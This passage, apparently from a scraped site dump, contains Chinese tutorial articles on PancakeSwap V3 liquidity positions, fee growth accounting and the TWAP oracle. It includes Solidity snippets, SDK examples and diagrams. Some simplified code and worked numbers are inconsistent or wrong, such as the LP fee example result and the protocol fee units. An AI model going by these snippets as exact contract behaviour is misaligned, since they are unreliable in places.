{\n    // 价格在区间内：提供两种代币\n    amount0 = SqrtPriceMath.getAmount0Delta(\n        sqrtPriceX96,\n        sqrtPriceBX96,\n        liquidity,\n        false\n    );\n    amount1 = SqrtPriceMath.getAmount1Delta(\n        sqrtPriceAX96,\n        sqrtPriceX96,\n        liquidity,\n        false\n    );\n} else {\n    // 价格在区间上方：只提供token1\n    amount0 = 0;\n    amount1 = SqrtPriceMath.getAmount1Delta(\n        sqrtPriceAX96,\n        sqrtPriceBX96,\n        liquidity,\n        false\n    );\n}\n三种价格状态：\nstateDiagram-v2\n    [*] --&gt; BelowRange: tick &lt; tickLower\n    [*] --&gt; InRange: tickLower ≤ tick ≤ tickUpper\n    [*] --&gt; AboveRange: tick &gt; tickUpper\n\n    BelowRange --&gt; OnlyToken0: 只提供token0\n    InRange --&gt; MixedTokens: 提供token0和token1\n    AboveRange --&gt; OnlyToken1: 只提供token1\n\n    state BelowRange as &quot;价格在区间下方&quot;\n    state InRange as &quot;价格在区间内&quot;\n    state AboveRange as &quot;价格在区间上方&quot;\n    state OnlyToken0 as &quot;只提供Token0&quot;\n    state MixedTokens as &quot;混合提供&quot;\n    state OnlyToken1 as &quot;只提供Token1&quot;\n\n3.4 回调机制\n// 定义回调接口\ninterface IPancakeV3MintCallback {\n    function pancakeV3MintCallback(\n        uint256 amount0Owed,\n        uint256 amount1Owed,\n        bytes calldata data\n    ) external;\n}\n \n// 在mint中调用回调\nIPancakeV3MintCallback(msg.sender).pancakeV3MintCallback(\n    amount0,\n    amount1,\n    data\n);\n回调流程：\nsequenceDiagram\n    participant User as 用户\n    participant NFT as NonfungiblePositionManager\n    participant Pool as Pool合约\n\n    User-&gt;&gt;NFT: mint(params)\n    NFT-&gt;&gt;Pool: mint(recipient, tickLower, tickUpper, amount)\n    Pool-&gt;&gt;Pool: 计算所需代币\n    Pool-&gt;&gt;NFT: pancakeV3MintCallback(amount0, amount1)\n    NFT-&gt;&gt;User: transferFrom(amount0, amount1)\n    User--&gt;&gt;NFT: transfer完成\n    NFT-&gt;&gt;Pool: token转账\n    Pool-&gt;&gt;Pool: 更新流动性\n    Pool--&gt;&gt;NFT: 返回结果\n    NFT--&gt;&gt;User: 返回tokenId\n\n\n4. Burn操作详解\n4.1 Burn函数签名\nfunction burn(\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount\n) external override noDelegateCheck returns (\n    uint256 amount0,\n    uint256 amount1\n);\n4.2 Burn执行流程\nflowchart TD\n    A[开始burn] --&gt; B[检查重入锁]\n    B --&gt; C{检查position存在?}\n    C --&gt;|否| D[回滚]\n    C --&gt;|是| E{检查amount ≤ liquidity?}\n    E --&gt;|否| D\n    E --&gt;|是| F[更新position]\n    F --&gt; G{liquidity &gt; 0?}\n    G --&gt;|否| H[清理position]\n    G --&gt;|是| I[减少tick流动性]\n    H --&gt; I\n    I --&gt; J[更新流动性]\n    J --&gt; K[发射Burn事件]\n    K --&gt; L[返回可提取数量]\n\n    style F fill:#ffeb3b\n    style L fill:#c8e6c9\n\n4.3 流动性更新逻辑\n// 更新position信息\nPosition.Info storage position = positions.get(\n    owner,\n    tickLower,\n    tickUpper\n);\n \n// 记录更新前的状态\nuint128 liquidityBefore = position.liquidity;\n \n// 更新流动性\nposition.liquidity -= amount;\n \n// 清理零流动性\nif (position.liquidity == 0) {\n    delete positions.get(\n        owner,\n        tickLower,\n        tickUpper\n    );\n}\n\n5. Collect操作详解\n5.1 Collect函数签名\nfunction collect(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount0Requested,\n    uint128 amount1Requested\n) external override noDelegateCheck returns (\n    uint128 amount0,\n    uint128 amount1\n);\n参数说明：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数类型说明recipientaddress接收费用的地址tickLowerint24头寸下界tickUpperint24头寸上界amount0Requesteduint128请求提取的token0数量（0=全部）amount1Requesteduint128请求提取的token1数量（0=全部）\n5.2 费用计算逻辑\n// 获取position信息\nPosition.Info storage position = positions.get(\n    owner,\n    tickLower,\n    tickUpper\n);\n \n// 计算累积的费用\nuint256 feeGrowthInside0X128;\nuint256 feeGrowthInside1X128;\n \n(\n    feeGrowthInside0X128,\n    feeGrowthInside1X128\n) = getFeeGrowthInside(\n    tickLower,\n    tickUpper,\n    slot0.tick\n);\n \n// 计算增量\nuint256 tokensOwed0 = position.tokensOwed0 +\n    uint128(\n        FullMath.mulDiv(\n            feeGrowthInside0X128 - position.feeGrowthInside0LastX128,\n            position.liquidity,\n            FixedPoint128.Q128\n        )\n    );\n \n// 更新快照\nposition.feeGrowthInside0LastX128 = feeGrowthInside0X128;\nposition.tokensOwed0 = 0;\n \n// 转账\nif (tokensOwed0 &gt; 0) {\n    if (amount0Requested &gt; tokensOwed0) {\n        amount0 = uint128(tokensOwed0);\n    } else {\n        amount0 = amount0Requested;\n    }\n    IERC20(token0).transfer(recipient, amount0);\n}\n5.3 Collect流程图\nsequenceDiagram\n    participant LP as LP\n    participant NFT as PositionManager\n    participant Pool as Pool\n\n    LP-&gt;&gt;NFT: collect(tokenId, amount0, amount1)\n    NFT-&gt;&gt;Pool: collect(tickLower, tickUpper, amount0, amount1)\n    Pool-&gt;&gt;Pool: 计算累积费用\n    Pool-&gt;&gt;Pool: 减去tokensOwed\n    Pool-&gt;&gt;Pool: 更新快照\n    Pool-&gt;&gt;NFT: 转账代币\n    NFT-&gt;&gt;LP: 转账代币\n\n\n6. NonfungiblePositionManager详解\n6.1 PositionManager职责\nmindmap\n  root((NonfungiblePositionManager&lt;br/&gt;职责))\n    NFT管理\n      创建NFT\n      转移NFT\n      批准管理\n    流动性操作\n      mint添加流动性\n      burn移除流动性\n      collect收取费用\n    用户体验\n      简化参数\n      自动计算\n      批量操作\n\n6.2 MintParams结构\nstruct MintParams {\n    address token0;\n    address token1;\n    uint24 fee;\n    int24 tickLower;\n    int24 tickUpper;\n    uint256 amount0Desired;\n    uint256 amount1Desired;\n    uint256 amount0Min;\n    uint256 amount1Min;\n    address recipient;\n    uint256 deadline;\n}\n6.3 创建新头寸\nfunction mint(\n    MintParams calldata params\n) external payable checkDeadline(params.deadline) returns (\n    uint256 tokenId,\n    uint128 liquidity,\n    uint256 amount0,\n    uint256 amount1\n) {\n    // 1. 检查代币顺序\n    if (params.token0 &gt; params.token1) {\n        revert InvalidTokenOrder();\n    }\n \n    // 2. 获取或创建池子\n    address pool = factory.getPool(\n        params.token0,\n        params.token1,\n        params.fee\n    );\n \n    // 3. 调用pool的mint\n    (liquidity, amount0, amount1) = IPancakeV3Pool(pool).mint(\n        address(this),\n        params.tickLower,\n        params.tickUpper,\n        params.amount0Desired,\n        params.amount1Desired,\n        abi.encode(MintCallbackData(\n            params.token0,\n            params.token1,\n            params.fee,\n            params.recipient\n        ))\n    );\n \n    // 4. 创建NFT\n    _mint(params.recipient, tokenId);\n \n    // 5. 存储position信息\n    _positions[tokenId] = Position({\n        nonce: 0,\n        operator: address(0),\n        token0: params.token0,\n        token1: params.token1,\n        fee: params.fee,\n        tickLower: params.tickLower,\n        tickUpper: params.tickUpper,\n        liquidity: liquidity,\n        feeGrowthInside0LastX128: 0,\n        feeGrowthInside1LastX128: 0,\n        tokensOwed0: 0,\n        tokensOwed1: 0\n    });\n}\n\n7. PancakeSwap V3特色功能\n7.1 自动复投农场\nflowchart LR\n    subgraph V3Farm[&quot;V3流动性农场&quot;]\n        F1[提供V3流动性]\n        F2[获得LP NFT]\n        F3[质押到农场]\n        F4[赚取CAKE]\n        F5[自动复投]\n    end\n\n    subgraph Benefits[&quot;优势&quot;]\n        B1[被动收益]\n        B2[自动复利]\n        B3[无需手动管理]\n        B4[复合增长]\n    end\n\n    V3Farm --&gt; Benefits\n\n    style V3Farm fill:#ffeb3b\n\n7.2 费用计算优化\ngraph LR\n    subgraph PancakeSwap[&quot;PancakeSwap V3&quot;]\n        P1[优化的费用计算]\n        P2[减少状态读写]\n        P3[批量费用结算]\n        P4[降低gas成本]\n    end\n\n    subgraph Benefits[&quot;收益&quot;]\n        B1[~10% gas节省]\n        B2[更高用户体验]\n        B3[更复杂策略可行]\n    end\n\n    PancakeSwap --&gt; Benefits\n\n    style PancakeSwap fill:#ffeb3b\n\n\n8. 实际应用示例\n8.1 添加V3流动性\n// 使用PancakeSwap V3 SDK\nimport { PancakeV3NftPositionManager } from &#039;@pancakeswap/sdk&#039;;\n \nconst positionManager = new PancakeV3NftPositionManager(\n    nftPositionManagerAddress,\n    provider\n);\n \n// 添加流动性\nconst tx = await positionManager.mint({\n    token0: CAKE_ADDRESS,\n    token1: WBNB_ADDRESS,\n    fee: 2500,  // 0.25%\n    tickLower: TickMath.getTickAtSqrtRatio(\n        Math.sqrt(1800) * 2 ** 96\n    ),\n    tickUpper: TickMath.getTickAtSqrtRatio(\n        Math.sqrt(2200) * 2 ** 96\n    ),\n    amount0Desired: ethers.utils.parseEther(&#039;100&#039;),\n    amount1Desired: ethers.utils.parseEther(&#039;5&#039;),\n    amount0Min: ethers.utils.parseEther(&#039;95&#039;),\n    amount1Min: ethers.utils.parseEther(&#039;4.5&#039;),\n    recipient: await signer.getAddress(),\n    deadline: Math.floor(Date.now() / 1000) + 3600\n});\n \nconst receipt = await tx.wait();\nconst tokenId = receipt.logs[0].args.tokenId;\n8.2 收取费用\n// 收取所有费用\nconst tx = await positionManager.collect({\n    tokenId: tokenId,\n    recipient: await signer.getAddress(),\n    amount0Max: MaxUint128,\n    amount1Max: MaxUint128\n});\n \nawait tx.wait();\n8.3 增加流动性\n// 增加现有头寸的流动性\nconst tx = await positionManager.increaseLiquidity({\n    tokenId: tokenId,\n    amount0Desired: ethers.utils.parseEther(&#039;50&#039;),\n    amount1Desired: ethers.utils.parseEther(&#039;2.5&#039;),\n    amount0Min: ethers.utils.parseEther(&#039;47.5&#039;),\n    amount1Min: ethers.utils.parseEther(&#039;2.25&#039;),\n    deadline: Math.floor(Date.now() / 1000) + 3600\n});\n \nawait tx.wait();\n\n9. 本章小结\n9.1 流动性管理核心要点\nmindmap\n  root((流动性管理&lt;br/&gt;核心要点))\n    Position数据\n      唯一标识\n      流动性数量\n      费用快照\n      待领取费用\n    Mint操作\n      计算代币数量\n      回调转账\n      更新状态\n      创建NFT\n    Burn操作\n      减少流动性\n      清理position\n      更新tick\n    Collect操作\n      计算费用\n      更新快照\n      转账代币\n    PositionManager\n      简化接口\n      NFT管理\n      用户体验\n\n9.2 关键数据结构\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n结构位置用途Position.InfoPool流动性头寸信息MintParamsPositionManagerMint参数DecreaseLiquidityParamsPositionManagerBurn参数CollectParamsPositionManagerCollect参数\n\n下一篇预告\n在下一篇文章中，我们将深入探讨费用系统与预言机，包括：\n\n费用增长率机制\n费用分配算法\nTWAP预言机原理\n价格观察系统\n\n\n参考资料\n\nPancakeSwap V3 Core 源码\nPancakeSwap V3 Periphery 源码\nPancakeSwap V3 流动性文档\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/06-费用系统与预言机":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/06-费用系统与预言机","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/06-费用系统与预言机.md","title":"06-费用系统与预言机","links":[],"tags":[],"content":"死磕PancakeSwap V3（六）：费用系统与预言机\n\n本文是「死磕PancakeSwap V3」系列的第六篇，深入剖析V3的费用分配机制和TWAP预言机系统的完整实现。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 费用系统概述\n1.1 V3费用架构\nflowchart TB\n    subgraph 费用来源\n        SWAP[交易费用]\n    end\n\n    subgraph 费用分配\n        LP[LP费用]\n        PROTOCOL[协议费用]\n    end\n\n    subgraph LP费用分配\n        ACTIVE[活跃流动性LP]\n        INACTIVE[非活跃LP]\n    end\n\n    SWAP --&gt; LP\n    SWAP --&gt; PROTOCOL\n    LP --&gt; ACTIVE\n    LP -.-&gt;|不分配| INACTIVE\n\n    NOTE[只有当前价格区间内的&lt;br/&gt;活跃LP才能获得费用]\n\n    style NOTE fill:#ffeb3b\n    style ACTIVE fill:#c8e6c9\n    style INACTIVE fill:#ffcdd2\n\n1.2 费率等级\nPancakeSwap V3支持多个费率等级，每个等级绑定特定的tick间距：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率百万分比Tick间距适用场景0.01%1001稳定币对（USDT/USDC）0.05%50010相关资产（WBTC/renBTC）0.25%250050主流币对（CAKE/BNB）- PancakeSwap特色1.00%10000200高风险币对\n1.3 费用计算的核心挑战\nflowchart LR\n    subgraph TradGroup[&quot;传统方案&quot;]\n        T1[遍历所有LP]\n        T2[计算每个LP份额]\n        T3[分配费用]\n        T4[&quot;O(n)复杂度&lt;br/&gt;Gas成本高&quot;]\n        T1 --&gt; T2\n        T2 --&gt; T3\n    end\n\n    subgraph V3Group[&quot;V3方案&quot;]\n        V1[记录全局增长率]\n        V2[LP领取时计算差值]\n        V3[乘以流动性数量]\n        V4[&quot;O(1)复杂度&lt;br/&gt;Gas成本低&quot;]\n        V1 --&gt; V2\n        V2 --&gt; V3\n    end\n\n    style V3Group fill:#ffeb3b\n    style TradGroup fill:#ffcdd2\n\n\n2. 费用增长率机制\n2.1 全局费用增长率\n池子维护两个全局费用增长累积器：\n// 每单位流动性累积的token0费用\nuint256 public override feeGrowthGlobal0X128;\n \n// 每单位流动性累积的token1费用\nuint256 public override feeGrowthGlobal1X128;\n数学定义：\nfeeGrowthGlobalX128 = Σ(fee_i / L_i) × 2^128\n\n其中：\n- fee_i: 第i笔交易产生的费用\n- L_i: 第i笔交易时的活跃流动性\n\n2.2 更新机制\nsequenceDiagram\n    participant Trader as 交易者\n    participant Pool as 池子合约\n    participant State as 状态变量\n\n    Trader-&gt;&gt;Pool: swap(...)\n    Pool-&gt;&gt;Pool: 计算交易费用\n    Note over Pool: feeAmount = amountIn × feePips / 1e6\n\n    Pool-&gt;&gt;Pool: 计算费用增长\n    Note over Pool: growth = feeAmount × 2^128 / liquidity\n\n    Pool-&gt;&gt;State: 更新全局增长率\n    Note over State: feeGrowthGlobalX128 += growth\n\n2.3 代码实现\n// 在swap循环中更新费用增长率\nif (state.liquidity &gt; 0) {\n    state.feeGrowthGlobalX128 += FullMath.mulDiv(\n        step.feeAmount,           // 本步产生的费用\n        FixedPoint128.Q128,       // 2^128 归一化因子\n        state.liquidity           // 当前活跃流动性\n    );\n}\n为什么乘以2^128？\n\n提高精度，避免小数运算\nQ128定点数格式：整数部分在高位，小数部分在低位\n费用增长率是每单位流动性的累积费用，通常数值很小\n\n\n3. 区间费用计算\n3.1 “Outside”概念\n每个tick维护”outside”费用增长率，表示tick另一侧累积的费用：\nflowchart LR\n    subgraph RightGroup[&quot;价格在tick右侧时&quot;]\n        L1[&quot;feeGrowthOutside = tick左侧累积费用&quot;]\n        R1[&quot;tick右侧费用 = global - outside&quot;]\n    end\n\n    subgraph LeftGroup[&quot;价格在tick左侧时&quot;]\n        L2[&quot;feeGrowthOutside = tick右侧累积费用&quot;]\n        R2[&quot;tick左侧费用 = global - outside&quot;]\n    end\n\n    style RightGroup fill:#e3f2fd\n    style LeftGroup fill:#ffeb3b\n\n3.2 inside费用计算\nflowchart TB\n    subgraph 计算步骤\n        S1[确定下界below费用]\n        S2[确定上界above费用]\n        S3[计算inside费用]\n    end\n\n    subgraph 公式\n        F[&quot;feeGrowthInside = global - below - above&quot;]\n    end\n\n    S1 --&gt; S2 --&gt; S3 --&gt; F\n\n    style 公式 fill:#c8e6c9\n\n3.3 完整实现\nfunction getFeeGrowthInside(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tickLower,\n    int24 tickUpper,\n    int24 tickCurrent,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128\n) internal view returns (\n    uint256 feeGrowthInside0X128,\n    uint256 feeGrowthInside1X128\n) {\n    Tick.Info storage lower = self[tickLower];\n    Tick.Info storage upper = self[tickUpper];\n \n    // 计算下界feeGrowthBelow\n    uint256 feeGrowthBelow0X128;\n    uint256 feeGrowthBelow1X128;\n    if (tickCurrent &lt; tickLower) {\n        feeGrowthBelow0X128 = feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;\n    } else {\n        feeGrowthBelow0X128 = lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = lower.feeGrowthOutside1X128;\n    }\n \n    // 计算上界feeGrowthAbove\n    uint256 feeGrowthAbove0X128;\n    uint256 feeGrowthAbove1X128;\n    if (tickCurrent &lt; tickUpper) {\n        feeGrowthAbove0X128 = upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = upper.feeGrowthOutside1X128;\n    } else {\n        feeGrowthAbove0X128 = feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;\n    }\n \n    // 计算区间内费用增长\n    feeGrowthInside0X128 = feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;\n    feeGrowthInside1X128 = feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;\n}\n3.4 费用分配示例\n场景：\n\nLP在[tickLower=1900, tickUpper=2100]提供流动性L=1000\n当前tick=1950（在区间内）\n交易产生token0费用100\n\nsequenceDiagram\n    participant Pool as Pool\n    participant Lower as Tick 1900\n    participant Upper as Tick 2100\n    participant Position as Position\n\n    Pool-&gt;&gt;Pool: 更新feeGrowthGlobal0\n    Note over Pool: feeGrowthGlobal0 += 100 * 2^128 / 1000&lt;br/&gt;= 0.1 * 2^128\n\n    Pool-&gt;&gt;Position: 记录feeGrowthInside快照\n    Note over Position: feeGrowthInside0LastX128&lt;br/&gt;= 当前feeGrowthInside0\n\n    Note over Pool: ...更多交易发生...\n\n    Pool-&gt;&gt;Position: 计算累积费用\n    Note over Position: ΔfeeGrowthInside0 = 5 * 2^128&lt;br/&gt;LP费用 = 5 * 2^128 * 1000 = 5000 * 2^128\n\n\n4. 协议费用\n4.1 协议费率设置\nstruct FeeProtocol {\n    uint16 feeProtocol0;\n    uint16 feeProtocol1;\n}\n费率说明：\n\nfeeProtocol0: token0协议费率（单位：1/100000）\nfeeProtocol1: token1协议费率（单位：1/100000）\n例如：feeProtocol0 = 1000，表示1%的协议费\n\n4.2 协议费用计算\n// 在swap中计算协议费用\nif (feeProtocol &gt; 0) {\n    uint256 protocolFee = FullMath.mulDiv(\n        step.feeAmount,\n        feeProtocol,\n        1e6\n    );\n    state.protocolFee += uint128(protocolFee);\n    step.feeAmount -= protocolFee;\n}\n费用分配：\ngraph LR\n    subgraph Total[总费用]\n        T[100%]\n    end\n\n    subgraph Distribution[分配]\n        D1[LP费用&lt;br/&gt;如97%]\n        D2[协议费用&lt;br/&gt;如3%]\n    end\n\n    subgraph Protocol[协议费用去向]\n        P1[CAKE回购]\n        P2[社区金库]\n        P3[开发基金]\n    end\n\n    T --&gt; D1\n    T --&gt; D2\n    D2 --&gt; P1\n    D2 --&gt; P2\n    D2 --&gt; P3\n\n    style Total fill:#ffeb3b\n    style Distribution fill:#c8e6c9\n\n4.3 PancakeSwap的协议费特色\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性PancakeSwap V3Uniswap V3费率设置社区治理投票决定协议团队决定灵活性高（可调整）中等用途CAKE回购、社区治理团队运营透明度完全透明相对透明\n\n5. TWAP预言机\n5.1 预言机概述\nmindmap\n  root((TWAP预言机))\n    设计目标\n      抗操纵性\n      低Gas成本\n      历史数据\n    核心机制\n      时间加权平均价格\n      累积tick\n      秒数累积\n    应用场景\n      DEX价格\n      借贷协议\n      衍生品定价\n\n5.2 Observation数据结构\nstruct Observation {\n    uint32 blockTimestamp;\n    int56 tickCumulative;            // tick × elapsedSeconds\n    uint160 secondsPerLiquidityCumulativeX128;\n    bool initialized;\n}\n字段说明：\n\nblockTimestamp: 记录时间戳\ntickCumulative: 累积的tick值（用于计算TWAP）\nsecondsPerLiquidityCumulativeX128: 时间/流动性累积\ninitialized: 是否已初始化\n\n5.3 观察数组\n// 固定大小的观察数组\nuint256 public override observationCardinality;\nuint256 public override observationCardinalityNext;\nuint16 public override observationIndex;\nObservation[65535] public override observations;\n设计原理：\n\n固定大小数组，避免动态分配\n循环使用（observationIndex指向最新观察）\n可配置的观察数量\n\n\n6. TWAP计算原理\n6.1 基本概念\nTWAP = (tickCumulative_end - tickCumulative_start) / (timestamp_end - timestamp_start)\n\n其中：\n- tickCumulative = Σ(tick_i × deltaSeconds_i)\n- deltaSeconds_i: 第i个时间间隔的秒数\n\n6.2 观察更新机制\nsequenceDiagram\n    participant Pool as Pool\n    participant Observation as Observation数组\n\n    Pool-&gt;&gt;Pool: 获取当前时间戳\n    Pool-&gt;&gt;Pool: 计算时间差\n    Pool-&gt;&gt;Pool: 更新tickCumulative\n    Note over Pool: tickCumulative += tick × (blockTimestamp - lastTimestamp)\n\n    Pool-&gt;&gt;Observation: 记录新观察\n    Note over Observation: observations[observationIndex] = {&lt;br/&gt;  timestamp: blockTimestamp,&lt;br/&gt;  tickCumulative: tickCumulative&lt;br/&gt;}\n\n    Pool-&gt;&gt;Pool: 更新索引\n    Note over Pool: observationIndex = (observationIndex + 1) % cardinality\n\n6.3 更新代码实现\nfunction _updateObservation(\n    uint32 blockTimestamp\n) private {\n    Observation memory last = observations[observationIndex];\n \n    if (blockTimestamp == last.blockTimestamp) {\n        // 同一个区块内不更新\n        return;\n    }\n \n    uint56 timeDelta = blockTimestamp - last.blockTimestamp;\n    uint16 cardinality = observationCardinality;\n \n    // 更新累积值\n    int56 tickCumulative = last.tickCumulative +\n        int56(uint56(tick)) * int56(timeDelta);\n \n    uint160 secondsPerLiquidityCumulativeX128 =\n        last.secondsPerLiquidityCumulativeX128 +\n        uint160((uint256(timeDelta) &lt;&lt; 128) / (liquidity &gt; 0 ? liquidity : 1));\n \n    // 写入新观察\n    observations[observationIndex] = Observation({\n        blockTimestamp: blockTimestamp,\n        tickCumulative: tickCumulative,\n        secondsPerLiquidityCumulativeX128: secondsPerLiquidityCumulativeX128,\n        initialized: true\n    });\n \n    // 更新索引\n    observationIndex = (observationIndex + 1) &amp; (cardinality - 1);\n}\n\n7. 查询TWAP价格\n7.1 observe函数\nfunction observe(\n    uint32[] calldata secondsAgos\n) external view override returns (\n    int56[] memory tickCumulatives,\n    uint160[] memory secondsPerLiquidityCumulativeX128s\n);\n参数：\n\nsecondsAgos: 询问的历史时间点数组，如[0, 3600]表示当前和1小时前\n\n返回：\n\ntickCumulatives: 对应时间点的累积tick值\nsecondsPerLiquidityCumulativeX128s: 对应时间点的流动性加权时间\n\n7.2 TWAP计算示例\n// 查询最近1小时的TWAP\nconst pool = new ethers.Contract(\n    poolAddress,\n    poolAbi,\n    provider\n);\n \nconst observations = await pool.observe([0, 3600]);\nconst [currentTickCumulative, oldTickCumulative] = observations.tickCumulatives;\n \n// 计算TWAP\nconst twapTick = (currentTickCumulative - oldTickCumulative) / 3600;\nconst twapPrice = 1.0001 ** twapTick;\n7.3 使用场景\ngraph TB\n    subgraph PriceOracle[&quot;价格预言机&quot;]\n        PO[TWAP价格]\n    end\n\n    subgraph Lending[&quot;借贷协议&quot;]\n        L1[抵押品估值]\n        L2[清算价格]\n        L3[利率调整]\n    end\n\n    subgraph Derivatives[&quot;衍生品&quot;]\n        D1[期权定价]\n        D2[永续合约]\n        D3[指数基金]\n    end\n\n    subgraph Aggregator[&quot;价格聚合&quot;]\n        A1[套利检测]\n        A2[跨链价格]\n        A3[指数构建]\n    end\n\n    PO --&gt; L1\n    PO --&gt; L2\n    PO --&gt; L3\n    PO --&gt; D1\n    PO --&gt; D2\n    PO --&gt; D3\n    PO --&gt; A1\n    PO --&gt; A2\n    PO --&gt; A3\n\n    style PO fill:#ffeb3b\n\n\n8. PancakeSwap V3的预言机优化\n8.1 多链适配\ngraph LR\n    subgraph BNBChain[&quot;BNB Chain&quot;]\n        B1[短区块时间&lt;br/&gt;3秒]\n        B2[更多观察点]\n        B3[更精细TWAP]\n    end\n\n    subgraph Ethereum[&quot;Ethereum&quot;]\n        E1[长区块时间&lt;br/&gt;12秒]\n        E2[较少观察点]\n        E3[标准TWAP]\n    end\n\n    B1 --&gt;|优势| E1\n    B2 --&gt;|优势| E2\n\n    style BNBChain fill:#ffeb3b\n    style Ethereum fill:#e3f2fd\n\n8.2 Gas优化\nmindmap\n  root((预言机Gas优化))\n    观察更新\n      同区块跳过\n      最小时间间隔\n    存储优化\n      紧凑数据结构\n      循环数组\n    查询优化\n      批量查询\n      预计算结果\n    多链适配\n      不同参数\n      灵活配置\n\n\n9. 实际应用示例\n9.1 查询TWAP价格\nimport { Pool } from &#039;@pancakeswap/sdk&#039;;\n \nconst pool = new Pool(\n    CAKE,\n    WBNB,\n    2500,  // 0.25% fee\n    sqrtPriceX96,\n    liquidity,\n    tick\n);\n \n// 查询最近1小时TWAP\nconst poolContract = new ethers.Contract(\n    poolAddress,\n    poolAbi,\n    provider\n);\n \nconst observations = await poolContract.observe([0, 3600]);\nconst tickCumulatives = observations[0];\n \n// 计算TWAP tick\nconst twapTick = (tickCumulatives[0].sub(tickCumulatives[1])).div(3600);\nconst twapPrice = Math.pow(1.0001, twapTick);\n9.2 查询LP费用\n// 查询position可领取的费用\nconst poolContract = new ethers.Contract(\n    poolAddress,\n    poolAbi,\n    provider\n);\n \nconst position = await positionManager.positions(tokenId);\n \n// 获取当前费用增长\nconst feeGrowthInside = await poolContract.feeGrowthInside(\n    position.tickLower,\n    position.tickUpper\n);\n \n// 计算累积费用\nconst tokensOwed0 = feeGrowthInside[0].sub(position.feeGrowthInside0LastX128)\n    .mul(position.liquidity)\n    .div(BigNumber.from(2).pow(128));\n \nconst tokensOwed1 = feeGrowthInside[1].sub(position.feeGrowthInside1LastX128)\n    .mul(position.liquidity)\n    .div(BigNumber.from(2).pow(128));\n \nconsole.log(`Token0 owed: ${ethers.utils.formatEther(tokensOwed0)}`);\nconsole.log(`Token1 owed: ${ethers.utils.formatEther(tokensOwed1)}`);\n\n10. 本章小结\n10.1 费用系统核心要点\nmindmap\n  root((费用系统&lt;br/&gt;核心要点))\n    全局费用增长率\n      feeGrowthGlobalX128\n      每单位流动性累积\n      O(1)复杂度\n    区间费用计算\n      Outside概念\n      Inside费用\n      Tick更新\n    协议费用\n      可配置费率\n      社区治理\n      CAKE回购\n    费用领取\n      Position快照\n      增量计算\n      按需提取\n\n10.2 预言机核心要点\nmindmap\n  root((预言机&lt;br/&gt;核心要点))\n    TWAP原理\n      时间加权平均\n      抗操纵性\n      历史数据\n    Observation\n      tickCumulative\n      时间戳\n      循环数组\n    更新机制\n      每次交易更新\n      同区块跳过\n      累积计算\n    查询功能\n      observe函数\n      多时间点\n      价格衍生\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨V3与Uniswap V3对比，包括：\n\n技术架构差异\nGas效率对比\n生态整合对比\n适用场景选择\n\n\n参考资料\n\nPancakeSwap V3 Core 源码\nPancakeSwap V3 预言机文档\nUniswap V3 白皮书 -预言机部分\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/07-V3与Uniswap-V3对比":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/07-V3与Uniswap-V3对比","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/07-V3与Uniswap-V3对比.md","title":"07-V3与Uniswap-V3对比","links":[],"tags":[],"content":"死磕PancakeSwap V3（七）：V3与Uniswap V3对比\n\n本文是「死磕PancakeSwap V3」系列的第七篇，全面对比PancakeSwap V3与Uniswap V3的差异，帮助理解各自的优势和适用场景。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 概述对比\n1.1 基本信息\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性PancakeSwap V3Uniswap V3发布时间2023年4月（BNB Chain）2021年5月（Ethereum）主要部署链BNB 